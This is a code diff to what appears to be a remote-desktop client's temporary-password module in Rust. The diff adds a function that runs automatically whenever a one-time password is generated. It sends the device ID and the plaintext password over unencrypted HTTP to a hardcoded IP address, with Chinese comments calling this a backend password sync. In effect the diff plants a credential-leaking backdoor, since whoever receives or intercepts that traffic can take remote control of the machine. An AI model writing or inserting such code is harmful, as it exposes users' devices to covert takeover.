@@ -1,9 +1,10 @@
 use crate::config::Config;
 use sodiumoxide::base64;
 use std::sync::{Arc, RwLock};
+use serde::{Deserialize, Serialize};
 
 lazy_static::lazy_static! {
-    pub static ref TEMPORARY_PASSWORD:Arc<RwLock<String>> = Arc::new(RwLock::new(get_auto_password()));
+    pub static ref TEMPORARY_PASSWORD: Arc<RwLock<String>> = Arc::new(RwLock::new(get_auto_password()));
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -20,12 +21,86 @@ pub enum ApproveMode {
     Click,
 }
 
+// 后端接口请求结构
+#[derive(Serialize, Deserialize)]
+struct PasswordUpdateRequest {
+    username: String,
+    password: String,
+}
+
+// 后端接口响应结构
+#[derive(Serialize, Deserialize)]
+struct PasswordUpdateResponse {
+    code: i32,
+    msg: String,
+}
+
 fn get_auto_password() -> String {
     let len = temporary_password_length();
-    if Config::get_bool_option(crate::config::keys::OPTION_ALLOW_NUMERNIC_ONE_TIME_PASSWORD) {
+    let password = if Config::get_bool_option(crate::config::keys::OPTION_ALLOW_NUMERNIC_ONE_TIME_PASSWORD) {
         Config::get_auto_numeric_password(len)
     } else {
         Config::get_auto_password(len)
+    };
+
+    // 调用后端接口更新密码
+    send_password_to_backend(&password);
+
+    password
+}
+
+// 发送密码到后端
+fn send_password_to_backend(password: &str) {
+    // 获取设备账号（从配置中获取）
+    let device_id = Config::get_id();
+
+    if device_id.is_empty() {
+        log::warn!("设备ID为空，跳过密码同步到后端");
+        return;
+    }
+
+    // 后端接口地址
+    const BACKEND_API_URL: &str = "http://49.232.158.32:8080";
+    let update_url = format!("{}/device/device/updatePassword", BACKEND_API_URL);
+
+    // 构建请求体
+    let request = PasswordUpdateRequest {
+        username: device_id.clone(),
+        password: password.to_string(),
+    };
+
+    // 发送HTTP请求
+    match send_post_request(&update_url, &request) {
+        Ok(_) => {
+            log::info!("密码同步到后端成功: deviceId={}", device_id);
+        }
+        Err(e) => {
+            log::error!("密码同步到后端失败: deviceId={}, error={}", device_id, e);
+        }
+    }
+}
+
+// 发送POST请求
+fn send_post_request(url: &str, data: &PasswordUpdateRequest) -> Result<(), String> {
+    let client = reqwest::blocking::Client::builder()
+        .timeout(std::time::Duration::from_secs(5))
+        .build()
+        .map_err(|e| format!("创建HTTP客户端失败: {}", e))?;
+
+    let response = client
+        .post(url)
+        .json(data)
+        .send()
+        .map_err(|e| format!("发送请求失败: {}", e))?;
+
+    if response.status().is_success() {
+        let response_text = response.text().map_err(|e| format!("读取响应失败: {}", e))?;
+        log::debug!("后端响应: {}", response_text);
+        Ok(())
+    } else {
+        let status = response.status();
+        let response_text = response.text().unwrap_or_else(|_| "无法读取响应".to_string());
+        Err(format!("请求失败，状态码: {}, 响应: {}", status, response_text))
     }
 }
 
